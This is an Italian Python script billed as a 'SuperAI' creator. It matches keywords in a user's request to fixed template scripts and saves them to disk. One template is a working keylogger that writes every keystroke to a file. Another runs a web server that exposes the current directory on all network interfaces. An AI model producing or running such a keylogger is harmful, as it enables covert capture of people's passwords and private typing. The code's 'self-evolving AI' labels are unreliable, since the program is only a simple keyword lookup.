# [EVOLVED] super_ai_creator.py - versione pulita MaxSystem

import os
import datetime

OUTPUT_DIR = "CodiciCreati"

if not os.path.exists(OUTPUT_DIR):
    os.makedirs(OUTPUT_DIR)

def genera_script(comando):
    comando = comando.lower()
    codice = ""

    if "keylogger" in comando:
        codice = (
            "# [EVOLVED] Keylogger di base\n"
            "import pynput.keyboard\n"
            "def log(tasto):\n"
            "    with open('log_keys.txt', 'a') as f:\n"
            "        try: f.write(tasto.char)\n"
            "        except: f.write(f'[{tasto}]')\n"
            "listener = pynput.keyboard.Listener(on_press=log)\n"
            "listener.start()\n"
            "listener.join()\n"
        )

    elif "server web" in comando or "webserver" in comando:
        codice = (
            "# [EVOLVED] Server Web di base\n"
            "from http.server import HTTPServer, SimpleHTTPRequestHandler\n"
            "server = HTTPServer(('0.0.0.0', 8080), SimpleHTTPRequestHandler)\n"
            "print('Server attivo su porta 8080...')\n"
            "server.serve_forever()\n"
        )

    elif "ai" in comando and "testi" in comando:
        codice = (
            "# [EVOLVED] AI semplice per generare testi\n"
            "import random\n"
            "temi = ['amore', 'guerra', 'universo', 'vita', 'tecnologia']\n"
            "frasi = [\n"
            "    'La potenza dell\'intelligenza artificiale è illimitata.',\n"
            "    'Un algoritmo ben progettato cambia tutto.',\n"
            "    'L\'uomo e la macchina possono convivere.',\n"
            "    'Ogni riga di codice è un battito di cuore.'\n"
            "]\n"
            "for _ in range(10):\n"
            "    print(f\"{random.choice(temi)}: {random.choice(frasi)}\")\n"
        )

    elif "file nascosti" in comando or "trova file" in comando:
        codice = (
            "# [EVOLVED] Trova tutti i file nascosti in C:\\\n"
            "import os\n"
            "for radice, cartelle, files in os.walk('C:\\\\'):\n"
            "    for nome in files:\n"
            "        percorso = os.path.join(radice, nome)\n"
            "        if os.path.isfile(percorso) and nome.startswith('.'):\n"
            "            print(percorso)\n"
        )

    elif "simula utente" in comando:
        codice = (
            "# [EVOLVED] Simula azioni utente con pyautogui\n"
            "import pyautogui\n"
            "import time\n"
            "time.sleep(2)\n"
            "pyautogui.write('Ciao, sono una AI.')\n"
            "pyautogui.press('enter')\n"
        )

    else:
        codice = "# [EVOLVED] Comando non riconosciuto.\nprint('Modulo da aggiornare.')"

    salva_script(comando, codice)
    return codice

def salva_script(comando, codice):
    nome_file = f"script_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.py"
    percorso = os.path.join(OUTPUT_DIR, nome_file)
    with open(percorso, "w", encoding="utf-8") as f:
        f.write(f"# [EVOLVED] Creato da SuperAI - Comando originale: {comando}\n\n")
        f.write(codice)
    print(f"[✅] Script generato: {percorso}")

if __name__ == "__main__":
    print("=== SUPERAI CREATOR - MAXSYSTEM ===")
    comando = input("Scrivi cosa vuoi creare: ")
    genera_script(comando)

# [AUTO-EVOLUZIONE COMPLETATA]
